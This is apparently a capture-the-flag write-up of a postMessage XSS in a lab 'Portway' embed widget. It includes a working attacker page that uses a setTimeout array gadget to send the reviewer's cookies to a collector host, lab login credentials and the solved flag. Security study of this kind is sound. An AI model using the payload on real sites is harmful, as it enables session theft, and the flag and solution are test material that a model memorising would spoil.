# Portway postMessage Indirect-Call Gadget XSS

## What Is Happening

The [Portway lab](https://c5ae55663e37.pwnbox-lab.com/) exposes a session-handoff widget at `/embed/handoff`. Partner apps are expected to drive it with `postMessage`, and users can report suspicious partner URLs for review in a fresh authenticated browser session.

This variant is not the older origin-trust or `targetOrigin` overload bugs. Instead, the widget exposes a debug-style handler that dynamically calls attacker-chosen global functions with attacker-controlled arguments.

## Why It Happens

The live widget contained:

```javascript
window.addEventListener('message', function(event) {
    if (event.data && event.data.action === 'log') {
        window[event.data.func](event.data)
    }
});
```

Three issues combine:

1. No `event.origin` validation.
2. Attacker-controlled dynamic dispatch: `window[event.data.func](event.data)`.
3. Legacy timer semantics let `setTimeout(arrayPayload)` execute the array's string form as code.

`eval` looks tempting but fails here because the call is indirect:

```javascript
window['eval'](['fetch(...)']) // does not execute
window['setTimeout'](['fetch(...)']) // executes fetch(...)
```

For `postMessage`, the payload must survive structured clone:

- custom `toString` functions are stripped
- `new String(code)` loses attached properties like `action` and `func`
- arrays keep string elements and own properties such as `action` and `func`

A popup is also important. In an iframe, third-party cookie restrictions often leave `document.cookie` empty. Opening `/embed/handoff` in a popup keeps the handoff page first-party so the reviewer's `flag` cookie is readable.

## Exact Test

Host an attacker-controlled partner page that:

1. opens `https://c5ae55663e37.pwnbox-lab.com/embed/handoff` in a popup
2. waits for the widget to load
3. sends a cloned array payload with `action`, `func`, and executable code

Minimal shape:

```html
<!doctype html>
<meta charset=utf-8>
<body>
<script>
const TARGET = 'https://c5ae55663e37.pwnbox-lab.com/embed/handoff';
const EXFIL = 'https://[collector]';
const w = window.open(TARGET, 'pw');
setTimeout(() => {
  const code = '(new Image).src="' + EXFIL + '/?c="+encodeURIComponent(document.cookie)';
  const p = [code];
  p.action = 'log';
  p.func = 'setTimeout';
  w.postMessage(p, '*');
}, 2000);
</script>
```

Report the partner URL through `POST /report` after logging in as `demo / demo123`.

## Expected Signal

- Local iframe tests may show XSS behavior but return empty cookies.
- In the reviewer flow, the collector should receive a request from the Portway origin.
- A successful hit includes the reviewer's non-HttpOnly flag cookie, for example:

```text
GET /?c=flag=pwnbox{...}
Referer: https://c5ae55663e37.pwnbox-lab.com/
```

## Result Interpretation

Confirmed bug chain:

```text
attacker partner page
-> popup /embed/handoff
-> postMessage({ action:'log', func:'setTimeout', 0:'...code...' })
-> window.setTimeout(arrayPayload)
-> XSS in Portway origin
-> exfil document.cookie / same-origin fetch
```

## Root Cause

The SDK treated partner `postMessage` data as an instruction surface and dispatched to global functions without origin checks or argument validation.

## Impact

- XSS in the provider origin
- theft of reviewer session state or lab flag cookie
- likely partner-integration compromise in real deployments using similar debug hooks

## Fix

- Remove debug dispatch hooks from production embeds
- Validate `event.origin` against an allowlist
- Never call `window[userInput](userInput)`
- Schema-validate message bodies and ignore unknown actions

## Flag

`pwnbox{41a864851130a234ef431e95309a03c3}`
